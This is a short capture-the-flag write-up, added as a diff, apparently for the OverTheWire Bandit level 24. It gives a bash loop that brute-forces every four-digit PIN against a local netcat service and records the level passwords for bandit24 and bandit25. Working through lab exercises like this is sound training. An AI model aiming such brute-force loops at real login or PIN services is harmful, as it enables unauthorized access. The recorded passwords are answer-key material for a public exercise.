@@ -1,0 +1,39 @@
+What I did:
+
+I made a script to iterate through 4 digit PIN numbers from 0000 to 9999.
+
+#!/bin/bash
+
+for((i=0;i<10000;i++))
+do
+    echo "$i" >> progress.txt
+    if [[ $i -lt 1000 ]]
+    then
+	if [[ $i -lt 100 ]]
+	then
+	    if [[ $i -lt 10 ]]
+	    then
+		echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 000$i"
+	    else
+		echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 00$i"
+	    fi
+	else
+	    echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0$i"
+	fi
+    else
+	echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i"
+    fi
+done
+
+I included the bandit24 password at the front of each line so that I can pipe
+this into my nc command. The command will read the file as if it were user
+input. I piped the output of the above script into a file called results.txt.
+
+nc localhost 30002 < results.txt > output.txt
+
+I had to do this twice since the localhost connection timed out after a couple
+seconds after trying about 7000 PINs. So I created a file with only PINs 7000+
+and did the same process. This time I tailed the 2nd file and got the
+password.
+
+bandit25 password: uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
